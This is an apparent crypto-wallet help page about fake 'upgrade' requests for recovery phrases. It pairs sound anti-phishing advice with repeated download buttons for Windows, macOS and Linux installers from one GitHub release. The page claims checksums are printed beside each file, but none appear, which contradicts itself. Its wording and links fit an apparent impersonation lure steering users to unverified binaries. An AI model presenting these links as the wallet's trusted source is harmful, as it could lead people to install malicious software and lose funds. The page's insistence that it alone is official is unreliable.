![Terra Station Wallet](assets/banner-article.png)

# Wallet Upgrade Asking for a Recovery Phrase: What to Do

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-5392F7?style=for-the-badge&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Download for Windows"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-5392F7?style=for-the-badge&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="Download for macOS"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-5392F7?style=for-the-badge&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | `terra-station-wallet-windows-v2.5.13.exe` |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | `terra-station-wallet-macos-v2.5.13.dmg` |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | `terra-station-wallet-linux-v2.5.13.zip` |

</div>

Every file in that table is attached to the [Terra Station Wallet release page](https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13), and the SHA-256 printed beside each name is the value published here.

> **Only download from this GitHub release page.** An installer offered anywhere else, however official it looks, is not a file this project published.

Terra Station Wallet never asks for your recovery phrase to update. An upgrade is a file you download and install; no step in it needs a phrase, a private key or a password sent anywhere. If a page, pop-up, message or app is asking for those words, it is not an upgrade - it is an attempt to take the wallet, and the phrase should stay untyped.

## Why the request is always fake

A phrase is the wallet. Anything that has it can restore the wallet on another machine and move every balance, so no genuine update could need it: the software package replaced during an update has no use for your keys. The wallet reads keys from storage it already owns, on the machine it already runs on.

Knowing the rule is more useful than recognising a particular fake, because the fakes change and the rule does not. https://github.com/terraclassic-wallet/lunc-wallet-recovery/blob/main/terra-station-seed-phrase.md states it from the wallet's side: setup and import are the only two screens that ever accept a phrase.

## How the request usually arrives

| Vector | What it looks like | Why it works |
|---|---|---|
| Lookalike site | A page above the real result, styled like a wallet's download or upgrade page | It arrives through a search, not through the project |
| Pop-up inside a page | A modal claiming your wallet needs an update to continue | It appears while you are already doing something |
| Direct message | "Support" offering to fix a stuck balance or validate a wallet | It sounds personal and urgent |
| Fake extension or app listing | A browser add-on or installer using the wallet's name | It borrows a name instead of a URL |

Every one of them ends in the same request: type the words. Some ask for a key instead, which is the same theft in a shorter format. *Is Terra Station Wallet Safe for LUNC* covers the model behind the rule, and *Is There a Terra Station Browser Extension* covers the browser case specifically.

## What a genuine update looks like

1. You go to the release page yourself, or follow it from the project's own repository.
2. You download the file for your platform and, if you verify downloads, compare it against the published checksum - *Verifying the Terra Station Wallet Checksum* shows the comparison.
3. You install it over the existing app. Nothing asks you to re-enter keys, and the wallets you already have stay in place.
4. You open the app and your balances are there, because nothing about an update changes the wallet itself.

No step involves a browser form, a chat window, an email reply or a "verification" screen. If an update process asks for anything secret, it is not the update.

## If the phrase has already been typed

Act on the assumption that the wallet is now shared with someone else, because that is what disclosure means - even if the page showed an error, even if nothing appeared to happen.

1. Install the current release (https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13) if you are not already on it, and open the app.
2. Create a new wallet and record its phrase offline before funding it.
3. Move the full balance - spendable and delegated - to the new wallet. Undelegating takes 21 days on Terra Classic, so start it immediately; https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-unstaking-21-days.md explains what happens during the wait.
4. Stop using the exposed wallet. Do not send anything to it, and do not treat a later "recovery" offer as help.

Speed matters more than tidiness. A balance that is still in the old wallet is a balance someone else can move.

## Can stolen crypto be recovered?

No - and this is the question where careful wording matters most. A transaction on Terra Classic is final: there is no reversal, no chargeback and no administrative override, which is exactly why the phrase must never leave your control. The wallet cannot freeze an address or pull funds back, and neither can the project that builds it.

Anyone offering to recover stolen crypto for a fee is selling something that does not exist, and the pages that rank for that search are overwhelmingly recovery services and law firms operating in the same space as the theft. Treat the offer as a second attempt at the same wallet: it usually asks for a payment up front, a "case fee", or a deposit to "unlock" the recovery - and sometimes for the phrase itself. *Is Terra Station Wallet Safe for LUNC* sets out what a real wallet will and will not do.

What is genuinely worth doing after a loss: stop using the exposed wallet, move anything left, and report the address and the messages to the platform where they arrived. None of that returns funds, and saying so plainly is more useful than a promise.

## Afterwards: make the next attempt harder

- Bookmark the release page instead of searching for it.
- Store the new wallet's phrase the way https://github.com/terraclassic-wallet/lunc-wallet-recovery/blob/main/store-terra-station-phrase-offline.md describes, on paper or metal, before the new wallet holds anything worth taking.
- Install the checksum comparison habit once; it takes a minute and it is the only step that proves a file is the file.
- Never let anyone remote into a machine that holds a wallet.
- Remember the direction of trust: the wallet proves itself with a signed build, and you never prove yourself to it with words.

## Questions people ask

### Does the wallet ever ask for a phrase during an update?

Never. Updates replace software; they do not need keys. Setup and import are the only screens that accept a phrase, and both are opened by you.

### I typed my phrase into a pop-up. Is it gone?

Assume it is compromised and move the balance to a new wallet immediately. A page that collected the words can use them at any time, and the transfer is irreversible once it happens.

### Is a "wallet validation" message ever real?

No. Validation is not a thing a self-custody wallet does. No support process, moderator, giveaway or migration requires a phrase or key.

### Can the project reverse a transaction for me?

No. The wallet signs what you approve and the chain records it; neither can be undone afterwards. That is the reason the phrase rule is absolute rather than advisory.
